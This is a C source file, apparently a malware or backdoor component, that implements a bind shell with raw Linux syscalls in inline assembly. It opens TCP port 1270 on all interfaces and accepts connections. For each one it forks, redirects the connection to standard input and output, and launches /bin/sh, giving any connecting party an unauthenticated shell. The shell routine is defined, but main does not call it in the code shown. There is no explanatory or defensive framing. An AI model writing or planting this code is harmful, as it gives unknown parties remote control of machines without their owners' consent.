#include <stdlib.h>
#include <netinet/in.h>

long create_socket()
{
    const int domain = AF_INET;
    const int type = SOCK_STREAM;
    const int protocol = 0; // TCP
    long sock = 0;
    asm("mov %1, %%rdi\n"
        "mov %2, %%rsi\n"
        "mov %3, %%rdx\n"
        "mov $41, %%rax\n" // sys_socket
        "syscall\n"
        "mov %%rax, %0"
        : "=r"(sock)
        : "g"(domain), "g"(type), "g"(protocol));

    return sock;
}

long bind_socket(long p_socket)
{
    long bind_return = 0;
    struct sockaddr_in sock_struct = {};

    sock_struct.sin_family = AF_INET;
    sock_struct.sin_port = 0xf604; //1270
    sock_struct.sin_addr.s_addr = INADDR_ANY;
    asm("mov %1, %%rdi\n"
        "mov %2, %%rsi\n"
        "mov %3, %%rdx\n"
        "mov $49, %%rax\n" // sys_bind
        "syscall\n"
        "mov %%rax, %0"
        : "=r"(bind_return)
        : "g"(p_socket), "g"(&sock_struct), "g"(sizeof(sock_struct)));

    return bind_return;
}

long listen_socket(long p_socket)
{
    const long backlog = 1;
    long listen_return = 0;
    asm("mov %1, %%rdi\n"
        "mov %2, %%rsi\n"
        "mov $50, %%rax\n"
        "syscall\n"
        "mov %%rax, %0"
        : "=r"(listen_return)
        : "g"(p_socket), "g"(backlog));

    return listen_return;
}

long accept_socket(long p_socket)
{
    long accept_fd = 0;
    struct sockaddr_in cli_addr = {};
    long cli_addr_len = sizeof(cli_addr);
    asm("mov %1, %%rdi\n"
        "mov %2, %%rsi\n"
        "mov %3, %%rdx\n"
        "mov $43, %%rax\n"
        "syscall\n"
        "mov %%rax, %0\n"
        : "=r"(accept_fd)
        : "g"(p_socket), "g"(&cli_addr), "g"(&cli_addr_len));

    return accept_fd;
}

long do_fork()
{
    long server_pid = 0;
    asm("mov $57, %%rax\n"
        "syscall\n"
        "mov %%rax, %0"
        : "=r"(server_pid));

    return server_pid;
}

void do_dup(long p_sock, long p_fd)
{
    asm("mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov $33, %%rax\n"
        "syscall"
    :
    : "g"(p_sock), "g"(p_fd));
}

void close_socket(long p_sock)
{
    asm("mov %0, %%rdi\n"
        "mov $3, %%rax\n"
        "syscall"
        :
        : "g"(p_sock));
}

void* thread_start(void* p_arg)
{
    (void)p_arg;

    long sock = create_socket();
    if (sock == -1)
    {
        return 0;
    }

    long bind_return = bind_socket(sock);
    if (bind_return != 0)
    {
        return 0;
    }

    long listen_return = listen_socket(sock);
    if (listen_return != 0)
    {
        return 0;
    }

    while (1)
    {
        long accept_fd = accept_socket(sock);
        if (accept_fd < 0)
        {
            return 0;
        }

        // read from the socket
        char buf[256] = { 0 };
        long read_result = 0;
        asm("mov %1, %%rdi\n"
            "mov %2, %%rsi\n"
            "mov %3, %%rdx\n"
            "mov $0, %%rax\n"
            "syscall\n"
            "mov %%rax, %0"
            : "=r"(read_result)
            : "g"(accept_fd), "g"(&buf), "g"(sizeof(buf) - 1));

        // fork
        long server_pid = do_fork();
        if (server_pid != 0)
        {
            do_dup(accept_fd, 0);
            do_dup(accept_fd, 1);
            do_dup(accept_fd, 2);

            // execve("/bin/sh", NULL, NULL);
            const char shell[] = "/bin/sh";
            asm("mov %0, %%rdi\n"
                "xor %%rsi, %%rsi\n"
                "xor %%rdx, %%rdx\n"
                "mov $59, %%rax\n"
                "syscall"
                :
                : "g"(&shell));

            close_socket(accept_fd);
            return 0;
        }

        close_socket(accept_fd);
    }
    return NULL;
}

int main(int argc, char *argv[])
{
    (void)argc;
    (void)argv;
    return EXIT_SUCCESS;
}
